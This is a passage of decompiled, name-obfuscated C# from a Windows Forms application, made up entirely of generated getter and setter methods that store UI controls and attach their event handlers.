		this.label_24 = label_30;
	}

	// Token: 0x06000723 RID: 1827 RVA: 0x00005FFA File Offset: 0x000041FA
	internal Button vmethod_518()
	{
		return this.button_4;
	}

	// Token: 0x06000724 RID: 1828 RVA: 0x00037DE0 File Offset: 0x00035FE0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_519(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_161);
		Button button = this.button_4;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_4 = button_9;
		button = this.button_4;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x06000725 RID: 1829 RVA: 0x00006002 File Offset: 0x00004202
	internal TabPage vmethod_520()
	{
		return this.tabPage_12;
	}

	// Token: 0x06000726 RID: 1830 RVA: 0x0000600A File Offset: 0x0000420A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_521(TabPage tabPage_17)
	{
		this.tabPage_12 = tabPage_17;
	}

	// Token: 0x06000727 RID: 1831 RVA: 0x00006013 File Offset: 0x00004213
	internal ToolStripMenuItem vmethod_522()
	{
		return this.toolStripMenuItem_99;
	}

	// Token: 0x06000728 RID: 1832 RVA: 0x00037E24 File Offset: 0x00036024
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_523(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_171);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_99;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_99 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_99;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000729 RID: 1833 RVA: 0x0000601B File Offset: 0x0000421B
	internal ContextMenuStrip vmethod_524()
	{
		return this.contextMenuStrip_9;
	}

	// Token: 0x0600072A RID: 1834 RVA: 0x00006023 File Offset: 0x00004223
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_525(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_9 = contextMenuStrip_14;
	}

	// Token: 0x0600072B RID: 1835 RVA: 0x0000602C File Offset: 0x0000422C
	internal ToolStripMenuItem vmethod_526()
	{
		return this.toolStripMenuItem_100;
	}

	// Token: 0x0600072C RID: 1836 RVA: 0x00037E68 File Offset: 0x00036068
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_527(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_172);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_100;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_100 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_100;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600072D RID: 1837 RVA: 0x00006034 File Offset: 0x00004234
	internal ToolStripSeparator vmethod_528()
	{
		return this.toolStripSeparator_23;
	}

	// Token: 0x0600072E RID: 1838 RVA: 0x0000603C File Offset: 0x0000423C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_529(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_23 = toolStripSeparator_39;
	}

	// Token: 0x0600072F RID: 1839 RVA: 0x00006045 File Offset: 0x00004245
	internal ToolStripMenuItem vmethod_530()
	{
		return this.toolStripMenuItem_101;
	}

	// Token: 0x06000730 RID: 1840 RVA: 0x0000604D File Offset: 0x0000424D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_531(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_101 = toolStripMenuItem_136;
	}

	// Token: 0x06000731 RID: 1841 RVA: 0x00006056 File Offset: 0x00004256
	internal ToolStripMenuItem vmethod_532()
	{
		return this.toolStripMenuItem_102;
	}

	// Token: 0x06000732 RID: 1842 RVA: 0x00037EAC File Offset: 0x000360AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_533(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_173);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_102;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_102 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_102;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000733 RID: 1843 RVA: 0x0000605E File Offset: 0x0000425E
	internal ToolStripSeparator vmethod_534()
	{
		return this.toolStripSeparator_24;
	}

	// Token: 0x06000734 RID: 1844 RVA: 0x00006066 File Offset: 0x00004266
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_535(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_24 = toolStripSeparator_39;
	}

	// Token: 0x06000735 RID: 1845 RVA: 0x0000606F File Offset: 0x0000426F
	internal ToolStripMenuItem vmethod_536()
	{
		return this.toolStripMenuItem_103;
	}

	// Token: 0x06000736 RID: 1846 RVA: 0x00037EF0 File Offset: 0x000360F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_537(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_174);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_103;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_103 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_103;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000737 RID: 1847 RVA: 0x00006077 File Offset: 0x00004277
	internal ToolStripSeparator vmethod_538()
	{
		return this.toolStripSeparator_25;
	}

	// Token: 0x06000738 RID: 1848 RVA: 0x0000607F File Offset: 0x0000427F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_539(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_25 = toolStripSeparator_39;
	}

	// Token: 0x06000739 RID: 1849 RVA: 0x00006088 File Offset: 0x00004288
	internal StatusStrip vmethod_540()
	{
		return this.statusStrip_7;
	}

	// Token: 0x0600073A RID: 1850 RVA: 0x00006090 File Offset: 0x00004290
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_541(StatusStrip statusStrip_11)
	{
		this.statusStrip_7 = statusStrip_11;
	}

	// Token: 0x0600073B RID: 1851 RVA: 0x00006099 File Offset: 0x00004299
	internal ToolStripStatusLabel vmethod_542()
	{
		return this.toolStripStatusLabel_26;
	}

	// Token: 0x0600073C RID: 1852 RVA: 0x000060A1 File Offset: 0x000042A1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_543(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_26 = toolStripStatusLabel_40;
	}

	// Token: 0x0600073D RID: 1853 RVA: 0x000060AA File Offset: 0x000042AA
	internal ToolStripProgressBar vmethod_544()
	{
		return this.toolStripProgressBar_4;
	}

	// Token: 0x0600073E RID: 1854 RVA: 0x000060B2 File Offset: 0x000042B2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_545(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_4 = toolStripProgressBar_8;
	}

	// Token: 0x0600073F RID: 1855 RVA: 0x000060BB File Offset: 0x000042BB
	internal ZeroitProgressIndicator vmethod_546()
	{
		return this.zeroitProgressIndicator_3;
	}

	// Token: 0x06000740 RID: 1856 RVA: 0x000060C3 File Offset: 0x000042C3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_547(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_3 = zeroitProgressIndicator_9;
	}

	// Token: 0x06000741 RID: 1857 RVA: 0x000060CC File Offset: 0x000042CC
	internal ZeroitAnidasoCircleProgress vmethod_548()
	{
		return this.zeroitAnidasoCircleProgress_4;
	}

	// Token: 0x06000742 RID: 1858 RVA: 0x000060D4 File Offset: 0x000042D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_549(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_4 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x06000743 RID: 1859 RVA: 0x000060DD File Offset: 0x000042DD
	internal GClass7 vmethod_550()
	{
		return this.gclass7_5;
	}

	// Token: 0x06000744 RID: 1860 RVA: 0x00037F34 File Offset: 0x00036134
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_551(GClass7 gclass7_13)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_181);
		ColumnClickEventHandler value2 = new ColumnClickEventHandler(this.method_186);
		KeyEventHandler value3 = new KeyEventHandler(this.method_193);
		GClass7 gclass = this.gclass7_5;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
			gclass.ColumnClick -= value2;
			gclass.KeyDown -= value3;
		}
		this.gclass7_5 = gclass7_13;
		gclass = this.gclass7_5;
		if (gclass != null)
		{
			gclass.MouseUp += value;
			gclass.ColumnClick += value2;
			gclass.KeyDown += value3;
		}
	}

	// Token: 0x06000745 RID: 1861 RVA: 0x000060E5 File Offset: 0x000042E5
	internal GClass7 vmethod_552()
	{
		return this.gclass7_6;
	}

	// Token: 0x06000746 RID: 1862 RVA: 0x00037FB0 File Offset: 0x000361B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_553(GClass7 gclass7_13)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_128);
		KeyEventHandler value2 = new KeyEventHandler(this.method_194);
		GClass7 gclass = this.gclass7_6;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
			gclass.KeyDown -= value2;
		}
		this.gclass7_6 = gclass7_13;
		gclass = this.gclass7_6;
		if (gclass != null)
		{
			gclass.MouseUp += value;
			gclass.KeyDown += value2;
		}
	}

	// Token: 0x06000747 RID: 1863 RVA: 0x000060ED File Offset: 0x000042ED
	internal ZeroitProgressIndicator vmethod_554()
	{
		return this.zeroitProgressIndicator_4;
	}

	// Token: 0x06000748 RID: 1864 RVA: 0x000060F5 File Offset: 0x000042F5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_555(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_4 = zeroitProgressIndicator_9;
	}

	// Token: 0x06000749 RID: 1865 RVA: 0x000060FE File Offset: 0x000042FE
	internal ZeroitProgressIndicator vmethod_556()
	{
		return this.zeroitProgressIndicator_5;
	}

	// Token: 0x0600074A RID: 1866 RVA: 0x00006106 File Offset: 0x00004306
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_557(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_5 = zeroitProgressIndicator_9;
	}

	// Token: 0x0600074B RID: 1867 RVA: 0x0000610F File Offset: 0x0000430F
	internal Label vmethod_558()
	{
		return this.label_25;
	}

	// Token: 0x0600074C RID: 1868 RVA: 0x00006117 File Offset: 0x00004317
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_559(Label label_30)
	{
		this.label_25 = label_30;
	}

	// Token: 0x0600074D RID: 1869 RVA: 0x00006120 File Offset: 0x00004320
	internal BackgroundWorker vmethod_560()
	{
		return this.backgroundWorker_1;
	}

	// Token: 0x0600074E RID: 1870 RVA: 0x00038010 File Offset: 0x00036210
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_561(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_192);
		BackgroundWorker backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_1 = backgroundWorker_4;
		backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600074F RID: 1871 RVA: 0x00006128 File Offset: 0x00004328
	internal ToolStripMenuItem vmethod_562()
	{
		return this.toolStripMenuItem_104;
	}

	// Token: 0x06000750 RID: 1872 RVA: 0x00038054 File Offset: 0x00036254
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_563(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_190);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_104;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_104 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_104;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000751 RID: 1873 RVA: 0x00006130 File Offset: 0x00004330
	internal TabPage vmethod_564()
	{
		return this.tabPage_13;
	}

	// Token: 0x06000752 RID: 1874 RVA: 0x00006138 File Offset: 0x00004338
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_565(TabPage tabPage_17)
	{
		this.tabPage_13 = tabPage_17;
	}

	// Token: 0x06000753 RID: 1875 RVA: 0x00006141 File Offset: 0x00004341
	internal ZeroitProgressIndicator vmethod_566()
	{
		return this.zeroitProgressIndicator_6;
	}

	// Token: 0x06000754 RID: 1876 RVA: 0x00006149 File Offset: 0x00004349
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_567(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_6 = zeroitProgressIndicator_9;
	}

	// Token: 0x06000755 RID: 1877 RVA: 0x00006152 File Offset: 0x00004352
	internal StatusStrip vmethod_568()
	{
		return this.statusStrip_8;
	}

	// Token: 0x06000756 RID: 1878 RVA: 0x0000615A File Offset: 0x0000435A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_569(StatusStrip statusStrip_11)
	{
		this.statusStrip_8 = statusStrip_11;
	}

	// Token: 0x06000757 RID: 1879 RVA: 0x00006163 File Offset: 0x00004363
	internal ToolStripStatusLabel vmethod_570()
	{
		return this.toolStripStatusLabel_27;
	}

	// Token: 0x06000758 RID: 1880 RVA: 0x0000616B File Offset: 0x0000436B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_571(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_27 = toolStripStatusLabel_40;
	}

	// Token: 0x06000759 RID: 1881 RVA: 0x00006174 File Offset: 0x00004374
	internal ToolStripStatusLabel vmethod_572()
	{
		return this.toolStripStatusLabel_28;
	}

	// Token: 0x0600075A RID: 1882 RVA: 0x0000617C File Offset: 0x0000437C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_573(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_28 = toolStripStatusLabel_40;
	}

	// Token: 0x0600075B RID: 1883 RVA: 0x00006185 File Offset: 0x00004385
	internal ToolStripProgressBar vmethod_574()
	{
		return this.toolStripProgressBar_5;
	}

	// Token: 0x0600075C RID: 1884 RVA: 0x0000618D File Offset: 0x0000438D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_575(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_5 = toolStripProgressBar_8;
	}

	// Token: 0x0600075D RID: 1885 RVA: 0x00006196 File Offset: 0x00004396
	internal ZeroitAnidasoCircleProgress vmethod_576()
	{
		return this.zeroitAnidasoCircleProgress_5;
	}

	// Token: 0x0600075E RID: 1886 RVA: 0x0000619E File Offset: 0x0000439E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_577(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_5 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x0600075F RID: 1887 RVA: 0x000061A7 File Offset: 0x000043A7
	internal GClass7 vmethod_578()
	{
		return this.gclass7_7;
	}

	// Token: 0x06000760 RID: 1888 RVA: 0x00038098 File Offset: 0x00036298
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_579(GClass7 gclass7_13)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_207);
		ColumnClickEventHandler value2 = new ColumnClickEventHandler(this.method_239);
		MouseEventHandler value3 = new MouseEventHandler(this.method_245);
		GClass7 gclass = this.gclass7_7;
		if (gclass != null)
		{
			gclass.KeyDown -= value;
			gclass.ColumnClick -= value2;
			gclass.MouseUp -= value3;
		}
		this.gclass7_7 = gclass7_13;
		gclass = this.gclass7_7;
		if (gclass != null)
		{
			gclass.KeyDown += value;
			gclass.ColumnClick += value2;
			gclass.MouseUp += value3;
		}
	}

	// Token: 0x06000761 RID: 1889 RVA: 0x000061AF File Offset: 0x000043AF
	internal ContextMenuStrip vmethod_580()
	{
		return this.contextMenuStrip_10;
	}

	// Token: 0x06000762 RID: 1890 RVA: 0x000061B7 File Offset: 0x000043B7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_581(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_10 = contextMenuStrip_14;
	}

	// Token: 0x06000763 RID: 1891 RVA: 0x000061C0 File Offset: 0x000043C0
	internal ToolStripMenuItem vmethod_582()
	{
		return this.toolStripMenuItem_105;
	}

	// Token: 0x06000764 RID: 1892 RVA: 0x00038114 File Offset: 0x00036314
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_583(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_191);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_105;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_105 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_105;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000765 RID: 1893 RVA: 0x000061C8 File Offset: 0x000043C8
	internal ToolStripSeparator vmethod_584()
	{
		return this.toolStripSeparator_26;
	}

	// Token: 0x06000766 RID: 1894 RVA: 0x000061D0 File Offset: 0x000043D0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_585(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_26 = toolStripSeparator_39;
	}

	// Token: 0x06000767 RID: 1895 RVA: 0x000061D9 File Offset: 0x000043D9
	internal ToolStripMenuItem vmethod_586()
	{
		return this.toolStripMenuItem_106;
	}

	// Token: 0x06000768 RID: 1896 RVA: 0x000061E1 File Offset: 0x000043E1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_587(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_106 = toolStripMenuItem_136;
	}

	// Token: 0x06000769 RID: 1897 RVA: 0x000061EA File Offset: 0x000043EA
	internal ToolStripMenuItem vmethod_588()
	{
		return this.toolStripMenuItem_107;
	}

	// Token: 0x0600076A RID: 1898 RVA: 0x00038158 File Offset: 0x00036358
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_589(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_201);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_107;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_107 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_107;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600076B RID: 1899 RVA: 0x000061F2 File Offset: 0x000043F2
	internal ToolStripSeparator vmethod_590()
	{
		return this.toolStripSeparator_27;
	}

	// Token: 0x0600076C RID: 1900 RVA: 0x000061FA File Offset: 0x000043FA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_591(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_27 = toolStripSeparator_39;
	}

	// Token: 0x0600076D RID: 1901 RVA: 0x00006203 File Offset: 0x00004403
	internal ToolStripMenuItem vmethod_592()
	{
		return this.toolStripMenuItem_108;
	}

	// Token: 0x0600076E RID: 1902 RVA: 0x0003819C File Offset: 0x0003639C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_593(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_202);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_108;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_108 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_108;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600076F RID: 1903 RVA: 0x0000620B File Offset: 0x0000440B
	internal ToolStripSeparator vmethod_594()
	{
		return this.toolStripSeparator_28;
	}

	// Token: 0x06000770 RID: 1904 RVA: 0x00006213 File Offset: 0x00004413
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_595(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_28 = toolStripSeparator_39;
	}

	// Token: 0x06000771 RID: 1905 RVA: 0x0000621C File Offset: 0x0000441C
	internal ToolStripMenuItem vmethod_596()
	{
		return this.toolStripMenuItem_109;
	}

	// Token: 0x06000772 RID: 1906 RVA: 0x000381E0 File Offset: 0x000363E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_597(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_180);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_109;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_109 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_109;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000773 RID: 1907 RVA: 0x00006224 File Offset: 0x00004424
	internal ToolStripMenuItem vmethod_598()
	{
		return this.toolStripMenuItem_110;
	}

	// Token: 0x06000774 RID: 1908 RVA: 0x0000622C File Offset: 0x0000442C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_599(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_110 = toolStripMenuItem_136;
	}

	// Token: 0x06000775 RID: 1909 RVA: 0x00006235 File Offset: 0x00004435
	internal ToolStripMenuItem vmethod_600()
	{
		return this.toolStripMenuItem_111;
	}

	// Token: 0x06000776 RID: 1910 RVA: 0x00038224 File Offset: 0x00036424
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_601(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_196);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_111;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_111 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_111;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000777 RID: 1911 RVA: 0x0000623D File Offset: 0x0000443D
	internal ToolStripMenuItem vmethod_602()
	{
		return this.toolStripMenuItem_112;
	}

	// Token: 0x06000778 RID: 1912 RVA: 0x00038268 File Offset: 0x00036468
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_603(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_198);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_112;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_112 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_112;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000779 RID: 1913 RVA: 0x00006245 File Offset: 0x00004445
	internal ToolStripMenuItem vmethod_604()
	{
		return this.toolStripMenuItem_113;
	}

	// Token: 0x0600077A RID: 1914 RVA: 0x000382AC File Offset: 0x000364AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_605(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_199);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_113;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_113 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_113;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600077B RID: 1915 RVA: 0x0000624D File Offset: 0x0000444D
	internal ToolStripMenuItem vmethod_606()
	{
		return this.toolStripMenuItem_114;
	}

	// Token: 0x0600077C RID: 1916 RVA: 0x000382F0 File Offset: 0x000364F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_607(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_197);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_114;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_114 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_114;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600077D RID: 1917 RVA: 0x00006255 File Offset: 0x00004455
	internal ToolStripSeparator vmethod_608()
	{
		return this.toolStripSeparator_29;
	}

	// Token: 0x0600077E RID: 1918 RVA: 0x0000625D File Offset: 0x0000445D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_609(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_29 = toolStripSeparator_39;
	}

	// Token: 0x0600077F RID: 1919 RVA: 0x00006266 File Offset: 0x00004466
	internal ToolStripMenuItem vmethod_610()
	{
		return this.toolStripMenuItem_115;
	}

	// Token: 0x06000780 RID: 1920 RVA: 0x00038334 File Offset: 0x00036534
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_611(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_200);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_115;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_115 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_115;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000781 RID: 1921 RVA: 0x0000626E File Offset: 0x0000446E
	internal TabPage vmethod_612()
	{
		return this.tabPage_14;
	}

	// Token: 0x06000782 RID: 1922 RVA: 0x00006276 File Offset: 0x00004476
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_613(TabPage tabPage_17)
	{
		this.tabPage_14 = tabPage_17;
	}

	// Token: 0x06000783 RID: 1923 RVA: 0x0000627F File Offset: 0x0000447F
	internal ZeroitProgressIndicator vmethod_614()
	{
		return this.zeroitProgressIndicator_7;
	}

	// Token: 0x06000784 RID: 1924 RVA: 0x00006287 File Offset: 0x00004487
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_615(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_7 = zeroitProgressIndicator_9;
	}

	// Token: 0x06000785 RID: 1925 RVA: 0x00006290 File Offset: 0x00004490
	internal StatusStrip vmethod_616()
	{
		return this.statusStrip_9;
	}

	// Token: 0x06000786 RID: 1926 RVA: 0x00006298 File Offset: 0x00004498
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_617(StatusStrip statusStrip_11)
	{
		this.statusStrip_9 = statusStrip_11;
	}

	// Token: 0x06000787 RID: 1927 RVA: 0x000062A1 File Offset: 0x000044A1
	internal ToolStripStatusLabel vmethod_618()
	{
		return this.toolStripStatusLabel_29;
	}

	// Token: 0x06000788 RID: 1928 RVA: 0x000062A9 File Offset: 0x000044A9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_619(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_29 = toolStripStatusLabel_40;
	}

	// Token: 0x06000789 RID: 1929 RVA: 0x000062B2 File Offset: 0x000044B2
	internal ToolStripProgressBar vmethod_620()
	{
		return this.toolStripProgressBar_6;
	}

	// Token: 0x0600078A RID: 1930 RVA: 0x000062BA File Offset: 0x000044BA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_621(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_6 = toolStripProgressBar_8;
	}

	// Token: 0x0600078B RID: 1931 RVA: 0x000062C3 File Offset: 0x000044C3
	internal ZeroitAnidasoCircleProgress vmethod_622()
	{
		return this.zeroitAnidasoCircleProgress_6;
	}

	// Token: 0x0600078C RID: 1932 RVA: 0x000062CB File Offset: 0x000044CB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_623(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_6 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x0600078D RID: 1933 RVA: 0x000062D4 File Offset: 0x000044D4
	internal GClass7 vmethod_624()
	{
		return this.gclass7_8;
